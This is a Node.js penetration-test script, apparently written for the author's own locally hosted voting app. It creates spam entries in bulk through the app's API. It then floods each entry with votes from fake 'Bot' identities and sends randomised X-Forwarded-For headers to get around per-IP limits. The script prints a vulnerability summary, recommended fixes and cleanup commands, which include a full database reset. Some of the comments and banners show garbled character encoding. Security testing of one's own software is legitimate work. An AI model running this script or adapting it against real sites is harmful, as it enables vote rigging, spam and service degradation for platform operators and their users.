#!/usr/bin/env node

/**
 * PENTEST SCRIPT: Mass Infrastructure Creation + Vote Manipulation
 *
 * Má»¥c tiÃªu: Táº¡o hÃ ng loáº¡t infrastructure spam vÃ  vote cho chÃºng
 * Severity: HIGH
 *
 * Usage:
 *   node 04-mass-manipulation.js [infra-count] [votes-per-infra] [base-url]
 *
 * Example:
 *   node 04-mass-manipulation.js 20 100
 */

const BASE_URL = process.argv[4] || 'http://localhost:3000';
const INFRA_COUNT = parseInt(process.argv[2] || '10', 10);
const VOTES_PER_INFRA = parseInt(process.argv[3] || '50', 10);

console.log(`
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘     ğŸ’£ MASS MANIPULATION ATTACK - PENTEST                â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

Infrastructure Count: ${INFRA_COUNT}
Votes per Infrastructure: ${VOTES_PER_INFRA}
Total Votes: ${INFRA_COUNT * VOTES_PER_INFRA}
Base URL: ${BASE_URL}
Attack Type: Mass Spam + Vote Flooding

[!] This will create spam infrastructures and flood votes
[!] Testing database resilience and spam detection
`);

// Generate spam infrastructure data
function generateSpamInfrastructure(index) {
  const spamNames = [
    'FREE BITCOIN CLICK HERE',
    'VIAGRA SALE 90% OFF',
    'WIN $1000000 NOW',
    'CLICK HERE FOR FREE IPHONE',
    'WORK FROM HOME $$$',
    'MEET SINGLES IN YOUR AREA',
    'ENLARGE YOUR INFRASTRUCTURE',
    'CRYPTO PUMP GROUP JOIN NOW',
    'NFT AIRDROP FREE MINT',
    'DOWNLOAD VIRUS.EXE'
  ];

  return {
    name: spamNames[index % spamNames.length] + ` #${index}`,
    description: `This is spam infrastructure #${index}. Testing system resilience against spam content. ` +
                 `${'SPAM '.repeat(20)}`,
    imageUrl: `https://via.placeholder.com/300?text=SPAM+${index}`
  };
}

async function createInfrastructure(index) {
  const payload = generateSpamInfrastructure(index);

  try {
    const response = await fetch(`${BASE_URL}/api/infrastructures`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });

    const data = await response.json();

    if (response.ok) {
      return { success: true, infrastructure: data, index };
    } else {
      return { success: false, error: data.error, index };
    }
  } catch (error) {
    return { success: false, error: error.message, index };
  }
}

async function voteForInfrastructure(infrastructureId, voteIndex) {
  const payload = {
    voterName: `Bot-${voteIndex}`,
    voterEmail: `bot${voteIndex}@spam.local`
  };

  try {
    const response = await fetch(`${BASE_URL}/api/infrastructures/${infrastructureId}/vote`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Forwarded-For': `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`
      },
      body: JSON.stringify(payload)
    });

    const data = await response.json();
    return { success: response.ok, data };
  } catch (error) {
    return { success: false, error: error.message };
  }
}

async function runAttack() {
  console.log('ğŸš€ Starting mass manipulation attack...\n');
  console.log('Phase 1: Creating spam infrastructures...\n');

  const startTime = Date.now();
  const createdInfrastructures = [];
  let infraSuccessCount = 0;
  let infraFailCount = 0;

  // Phase 1: Create spam infrastructures
  for (let i = 0; i < INFRA_COUNT; i++) {
    const result = await createInfrastructure(i + 1);

    if (result.success) {
      infraSuccessCount++;
      createdInfrastructures.push(result.infrastructure);
      console.log(`âœ… Created infrastructure ${i + 1}/${INFRA_COUNT}: ${result.infrastructure.name} (ID: ${result.infrastructure.id})`);
    } else {
      infraFailCount++;
      console.log(`âŒ Failed to create infrastructure ${i + 1}/${INFRA_COUNT}: ${result.error}`);
    }

    // Small delay to avoid overwhelming the server
    await new Promise(resolve => setTimeout(resolve, 200));
  }

  console.log(`\n${'='.repeat(60)}`);
  console.log('ğŸ“Š PHASE 1 SUMMARY - Infrastructure Creation');
  console.log('='.repeat(60));
  console.log(`âœ… Created: ${infraSuccessCount}`);
  console.log(`âŒ Failed: ${infraFailCount}`);
  console.log('='.repeat(60));

  if (createdInfrastructures.length === 0) {
    console.log('\nâŒ No infrastructures created. Attack stopped.');
    return;
  }

  // Phase 2: Vote flooding for each infrastructure
  console.log('\n\nPhase 2: Vote flooding for each infrastructure...\n');

  let totalVotesSuccess = 0;
  let totalVotesFail = 0;

  for (let i = 0; i < createdInfrastructures.length; i++) {
    const infra = createdInfrastructures[i];
    console.log(`\nğŸ¯ Flooding votes for: ${infra.name} (${i + 1}/${createdInfrastructures.length})`);

    let infraVotesSuccess = 0;

    // Vote in batches
    const BATCH_SIZE = 5;
    for (let vote = 0; vote < VOTES_PER_INFRA; vote += BATCH_SIZE) {
      const batchPromises = [];

      for (let b = 0; b < BATCH_SIZE && (vote + b) < VOTES_PER_INFRA; b++) {
        batchPromises.push(voteForInfrastructure(infra.id, vote + b + 1));
      }

      const results = await Promise.all(batchPromises);

      results.forEach(result => {
        if (result.success) {
          totalVotesSuccess++;
          infraVotesSuccess++;
        } else {
          totalVotesFail++;
        }
      });

      process.stdout.write(`\r   Progress: ${Math.min(vote + BATCH_SIZE, VOTES_PER_INFRA)}/${VOTES_PER_INFRA} votes | Success: ${infraVotesSuccess}`);

      await new Promise(resolve => setTimeout(resolve, 100));
    }

    console.log(` âœ… Done!`);
  }

  const endTime = Date.now();
  const duration = (endTime - startTime) / 1000;

  console.log(`\n\n${'='.repeat(60)}`);
  console.log('ğŸ“Š PHASE 2 SUMMARY - Vote Flooding');
  console.log('='.repeat(60));
  console.log(`âœ… Total votes created: ${totalVotesSuccess}`);
  console.log(`âŒ Failed votes: ${totalVotesFail}`);
  console.log(`â±ï¸  Duration: ${duration.toFixed(2)}s`);
  console.log('='.repeat(60));

  console.log(`\n\n${'='.repeat(60)}`);
  console.log('ğŸ¯ FINAL ATTACK SUMMARY');
  console.log('='.repeat(60));
  console.log(`ğŸ—ï¸  Spam Infrastructures: ${infraSuccessCount}`);
  console.log(`ğŸ—³ï¸  Total Votes: ${totalVotesSuccess}`);
  console.log(`â±ï¸  Total Duration: ${duration.toFixed(2)}s`);
  console.log(`ğŸ“Š Database Pollution Level: ${(infraSuccessCount + totalVotesSuccess)} records`);
  console.log('='.repeat(60));

  // Vulnerability assessment
  console.log('\nğŸ” VULNERABILITY ASSESSMENT:');
  console.log('ğŸ”´ CRITICAL VULNERABILITIES FOUND:');
  console.log(`   1. No infrastructure creation rate limiting`);
  console.log(`   2. No content validation or spam detection`);
  console.log(`   3. No vote deduplication or rate limiting`);
  console.log(`   4. Database can be polluted with spam indefinitely`);
  console.log(`   5. No CAPTCHA or human verification`);

  console.log('\nğŸ’£ IMPACT:');
  console.log('   â€¢ Legitimate infrastructures buried under spam');
  console.log('   â€¢ Database bloated with useless data');
  console.log('   â€¢ Vote counts completely manipulated');
  console.log('   â€¢ User experience destroyed by spam');
  console.log('   â€¢ Potential DoS through resource exhaustion');

  console.log('\nğŸ’¡ RECOMMENDATIONS:');
  console.log('  1. Implement authentication for infrastructure creation');
  console.log('  2. Add rate limiting on both endpoints (per IP/user)');
  console.log('  3. Implement spam detection (keywords, patterns)');
  console.log('  4. Add moderation queue for new infrastructures');
  console.log('  5. Implement CAPTCHA for submissions');
  console.log('  6. Add vote deduplication (one vote per user/IP)');
  console.log('  7. Monitor and alert on suspicious patterns');
  console.log('  8. Add admin tools to bulk delete spam');

  console.log('\nğŸ§¹ CLEANUP:');
  console.log('  Run these commands to clean up spam:');
  console.log('  ');
  console.log('  # Connect to database');
  console.log('  docker-compose exec db psql -U vote -d vote_infrastructure');
  console.log('  ');
  console.log('  # Delete spam infrastructures (and votes via cascade)');
  console.log('  DELETE FROM infrastructures WHERE description LIKE \'%SPAM SPAM%\';');
  console.log('  ');
  console.log('  # Or reset everything');
  console.log('  yarn prisma migrate reset');

  // Output infrastructure IDs for cleanup
  console.log('\nğŸ“‹ Created Infrastructure IDs (for manual cleanup):');
  createdInfrastructures.slice(0, 10).forEach((infra, idx) => {
    console.log(`   ${idx + 1}. ${infra.id} - ${infra.name}`);
  });
  if (createdInfrastructures.length > 10) {
    console.log(`   ... and ${createdInfrastructures.length - 10} more`);
  }
}

console.log('âš ï¸  WARNING: This will create spam and flood the database!');
console.log('   Make sure you can clean up afterwards!');
console.log('   Press Ctrl+C to cancel, or wait 5 seconds to continue...\n');

setTimeout(() => {
  runAttack().catch(error => {
    console.error('\nâŒ Attack failed:', error.message);
    process.exit(1);
  });
}, 5000);
